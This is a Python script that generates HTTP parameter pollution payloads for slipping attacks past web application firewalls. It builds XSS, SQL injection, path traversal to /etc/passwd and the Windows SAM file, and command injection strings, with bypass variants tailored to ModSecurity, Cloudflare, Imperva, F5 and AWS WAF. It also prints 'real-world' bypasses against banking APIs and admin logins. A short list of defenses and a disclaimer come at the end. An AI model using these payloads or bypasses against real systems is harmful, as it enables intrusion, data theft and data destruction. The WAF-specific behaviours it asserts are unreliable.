#!/usr/bin/env python3
"""
Practical HPP WAF Bypass Demonstration
Shows how parameter pollution defeats input validation
"""

import urllib.parse
from typing import List, Dict

class HPPBypassGenerator:
    """Generate HPP payloads for common attack scenarios"""
    
    def __init__(self):
        self.test_vectors = {
            'xss': ["<script>alert(1)</script>", "javascript:alert(1)", 
                   "<img src=x onerror=alert(1)>"],
            'sqli': ["' OR '1'='1", "' UNION SELECT NULL--", "1'; DROP TABLE users--"],
            'lfi': ["../../etc/passwd", "../../../windows/system32/config/sam"],
            'cmdi': ["; cat /etc/passwd", "| whoami", "&& id"],
        }
    
    def generate_bypass_payloads(self, attack_type: str, param: str = "id") -> Dict[str, List[str]]:
        """
        Generate HPP variations for a specific attack type
        Returns dict of technique_name -> [payloads]
        """
        
        if attack_type not in self.test_vectors:
            raise ValueError(f"Unknown attack type: {attack_type}")
        
        payloads = {}
        base_malicious = self.test_vectors[attack_type][0]
        
        # ═══════════════════════════════════════════════════════════
        # BYPASS 1: First-Last Ambiguity
        # ═══════════════════════════════════════════════════════════
        
        payloads['first_last_ambiguity'] = [
            # WAF checks first (clean), backend uses last (malicious)
            f"{param}=1&{param}={base_malicious}",
            
            # Reverse (for Tomcat/JSP)
            f"{param}={base_malicious}&{param}=1",
            
            # Triple confusion
            f"{param}=1&{param}={base_malicious}&{param}=1",
        ]
        
        # ═══════════════════════════════════════════════════════════
        # BYPASS 2: Concatenation Exploitation (ASP.NET)
        # ═══════════════════════════════════════════════════════════
        
        # ASP.NET concatenates with comma: "value1,value2"
        # Split attack payload across parameters
        if attack_type == 'xss':
            payloads['asp_concatenation'] = [
                f"{param}=<script&{param}=>alert(1)&{param}=</script>",
                f"{param}=<img&{param}= src&{param}==x&{param}= onerror&{param}==alert(1)>",
            ]
        elif attack_type == 'sqli':
            payloads['asp_concatenation'] = [
                f"{param}='&{param}= OR&{param}= '1'&{param}=='1",
                f"{param}=1'&{param}= UNION&{param}= SELECT&{param}= NULL--",
            ]
        
        # ═══════════════════════════════════════════════════════════
        # BYPASS 3: Array Notation Confusion
        # ═══════════════════════════════════════════════════════════
        
        payloads['array_notation'] = [
            # PHP interprets [] as array, but WAF might not
            f"{param}[]=1&{param}[]={base_malicious}",
            
            # Mixed notation
            f"{param}=1&{param}[]={base_malicious}",
            
            # Indexed arrays
            f"{param}[0]=1&{param}[1]={base_malicious}",
            
            # Nested
            f"{param}[safe]=1&{param}[xss]={base_malicious}",
        ]
        
        # ═══════════════════════════════════════════════════════════
        # BYPASS 4: Encoding Confusion
        # ═══════════════════════════════════════════════════════════
        
        encoded = urllib.parse.quote(base_malicious)
        double_encoded = urllib.parse.quote(encoded)
        
        payloads['encoding_confusion'] = [
            # One plain, one encoded
            f"{param}=1&{param}={encoded}",
            
            # Double encoding on second
            f"{param}=1&{param}={double_encoded}",
            
            # Mixed case param names
            f"{param}=1&{param.upper()}={base_malicious}",
            
            # Unicode normalization attacks
            f"{param}=1&{param}=%u003cscript%u003e" if attack_type == 'xss' else f"{param}=1&{param}={encoded}",
        ]
        
        # ═══════════════════════════════════════════════════════════
        # BYPASS 5: Separator Confusion
        # ═══════════════════════════════════════════════════════════
        
        payloads['separator_confusion'] = [
            # Some parsers treat ; as &
            f"{param}=1;{param}={base_malicious}",
            
            # Null byte separator
            f"{param}=1%00&{param}={base_malicious}",
            
            # Newline injection
            f"{param}=1%0a&{param}={base_malicious}",
            
            # Mixed separators
            f"{param}=1&{param}={base_malicious};{param}=1",
        ]
        
        # ═══════════════════════════════════════════════════════════
        # BYPASS 6: Parameter Name Variations
        # ═══════════════════════════════════════════════════════════
        
        payloads['name_variations'] = [
            # Null byte in param name
            f"{param}%00=1&{param}={base_malicious}",
            
            # Whitespace variations
            f"{param}=1&{param}%20={base_malicious}",
            f"{param}=1& {param}={base_malicious}",
            
            # Unicode variations (if param name has ASCII)
            f"{param}=1&{param}\u200b={base_malicious}",  # Zero-width space
        ]
        
        return payloads
    
    def generate_waf_specific_bypasses(self, waf_type: str, attack_payload: str, 
                                      param: str = "q") -> List[str]:
        """
        Generate WAF-specific HPP bypasses
        
        Different WAFs have different parameter handling logic
        """
        
        bypasses = []
        
        if waf_type.lower() == "modsecurity":
            # ModSecurity typically checks first parameter
            bypasses = [
                f"{param}=safe&{param}={attack_payload}",
                f"{param}[]=safe&{param}[]={attack_payload}",
            ]
        
        elif waf_type.lower() == "cloudflare":
            # Cloudflare sometimes case-sensitive
            bypasses = [
                f"{param}=safe&{param.upper()}={attack_payload}",
                f"{param}=safe&{param}={attack_payload}&{param}=safe",
            ]
        
        elif waf_type.lower() == "imperva":
            # Imperva (Incapsula) pollution techniques
            bypasses = [
                f"{param}=safe&{param}%00={attack_payload}",
                f"{param}=safe;{param}={attack_payload}",
            ]
        
        elif waf_type.lower() == "f5":
            # F5 ASM bypasses
            bypasses = [
                f"{param}=safe&{param}[]={attack_payload}",
                f"{param}[0]=safe&{param}[1]={attack_payload}",
            ]
        
        elif waf_type.lower() == "aws":
            # AWS WAF
            bypasses = [
                f"{param}=safe&{param}={attack_payload}",
                f"{param}=safe&{urllib.parse.quote(param)}={attack_payload}",
            ]
        
        return bypasses
    
    def print_attack_scenarios(self):
        """Display practical attack scenarios"""
        
        print("\n" + "=" * 70)
        print("PRACTICAL HPP BYPASS SCENARIOS")
        print("=" * 70)
        
        scenarios = [
            {
                'name': 'XSS Bypass via Parameter Duplication',
                'attack': 'xss',
                'description': 'WAF blocks <script> in single param, misses duplicate',
                'example': 'search=hello&search=<script>alert(document.cookie)</script>'
            },
            {
                'name': 'SQLi via Array Notation',
                'attack': 'sqli',
                'description': 'PHP creates array, WAF doesn\'t parse [] correctly',
                'example': "id[]=1&id[]=' OR 1=1--"
            },
            {
                'name': 'LFI via Encoding Confusion',
                'attack': 'lfi',
                'description': 'First param plain (passes WAF), second encoded (backend decodes)',
                'example': 'file=safe.txt&file=..%2F..%2Fetc%2Fpasswd'
            },
            {
                'name': 'Command Injection via Concatenation',
                'attack': 'cmdi',
                'description': 'ASP.NET concatenates params with comma',
                'example': 'cmd=ping&cmd= -c&cmd= 1&cmd= ;cat /etc/passwd'
            }
        ]
        
        for scenario in scenarios:
            print(f"\n[SCENARIO] {scenario['name']}")
            print(f"Description: {scenario['description']}")
            print(f"Example: ?{scenario['example']}")
            print(f"\nFull Payloads:")
            
            payloads = self.generate_bypass_payloads(scenario['attack'])
            
            for technique, payload_list in payloads.items():
                print(f"\n  [{technique.replace('_', ' ').title()}]")
                for p in payload_list[:2]:  # Show first 2 of each
                    print(f"    • ?{p}")


def demonstrate_real_world_bypasses():
    """Show real-world HPP bypass examples"""
    
    print("\n" + "=" * 70)
    print("REAL-WORLD WAF BYPASS EXAMPLES")
    print("=" * 70)
    
    examples = [
        {
            'target': 'E-commerce Search Function',
            'waf': 'ModSecurity',
            'blocked': '?search=<script>alert(1)</script>',
            'bypass': '?search=products&search=<script>alert(document.cookie)</script>',
            'explanation': 'ModSecurity checks first parameter (clean), PHP uses last'
        },
        {
            'target': 'Banking API Endpoint',
            'waf': 'Cloudflare',
            'blocked': "?account=' OR '1'='1",
            'bypass': "?account=12345&ACCOUNT=' OR '1'='1",
            'explanation': 'Case-sensitive WAF rule, case-insensitive backend merge'
        },
        {
            'target': 'Admin Panel Login',
            'waf': 'AWS WAF',
            'blocked': '?user=admin&password=x&admin=true',
            'bypass': '?user=admin&password=x&admin=false&admin=true',
            'explanation': 'WAF checks for admin=true, backend uses last occurrence'
        },
        {
            'target': 'File Download Service',
            'waf': 'Imperva',
            'blocked': '?file=../../etc/passwd',
            'bypass': '?file=report.pdf&file[]=../../etc/passwd',
            'explanation': 'Array notation bypasses path traversal detection'
        },
        {
            'target': 'ASP.NET Web Form',
            'waf': 'F5 ASM',
            'blocked': '?name=<img src=x onerror=alert(1)>',
            'bypass': '?name=John&name=<img&name= src=x&name= onerror=alert(1)>',
            'explanation': 'ASP.NET concatenates with comma, splits XSS across params'
        }
    ]
    
    for i, ex in enumerate(examples, 1):
        print(f"\n[EXAMPLE {i}] {ex['target']}")
        print(f"WAF: {ex['waf']}")
        print(f"Blocked: {ex['blocked']}")
        print(f"✓ Bypass: {ex['bypass']}")
        print(f"Why: {ex['explanation']}")


def show_defense_recommendations():
    """Display mitigation strategies"""
    
    print("\n\n" + "=" * 70)
    print("DEFENSE AGAINST HPP ATTACKS")
    print("=" * 70)
    
    defenses = [
        ("1. Strict Parameter Parsing", 
         "Reject HTTP requests with duplicate parameter names entirely"),
        
        ("2. Consistent Normalization",
         "Ensure WAF and backend parse parameters identically"),
        
        ("3. Validate All Occurrences",
         "If duplicates are allowed, validate EVERY occurrence, not just first/last"),
        
        ("4. Use Parameter Allowlists",
         "Define exact parameter names/types expected, reject extras"),
        
        ("5. Disable Parameter Merging",
         "Don't merge GET/POST/COOKIE parameters into single array"),
        
        ("6. Framework Configuration",
         "PHP: max_input_vars limit | ASP.NET: aspnet:MaxHttpCollectionKeys"),
        
        ("7. WAF Rules Enhancement",
         "Configure WAF to check ALL parameter occurrences, not just first"),
        
        ("8. Input Sanitization",
         "Sanitize inputs AFTER parameter parsing, not during"),
    ]
    
    for title, desc in defenses:
        print(f"\n{title}")
        print(f"  → {desc}")
    
    print("\n" + "=" * 70)


if __name__ == "__main__":
    generator = HPPBypassGenerator()
    
    # Show practical scenarios
    generator.print_attack_scenarios()
    
    # Show real-world examples
    demonstrate_real_world_bypasses()
    
    # Show defenses
    show_defense_recommendations()
    
    print("\n[*] For authorized security testing only")
    print("[*] Use responsibly in controlled environments")
